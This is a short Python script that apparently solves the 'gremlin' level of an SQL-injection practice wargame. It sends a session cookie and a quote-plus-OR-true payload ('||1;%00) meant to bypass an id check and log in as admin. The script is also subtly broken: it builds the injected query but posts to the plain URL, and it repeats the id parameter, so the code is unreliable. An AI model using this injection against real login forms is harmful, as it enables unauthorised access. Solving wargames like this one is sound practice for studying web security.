import requests as req

flag = ""
length = 0

url = "https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id="
session = dict(PHPSESSID = "mnaift1jigmvrs6miarunliob0")

print('[+] start')

print('[+] solve_the_problem')

query = url + "id=\'||1;%00"
response = req.post(url = url, cookies = session)

if "Hello admin" in response.text:
    print('[+] problem_is_solved')
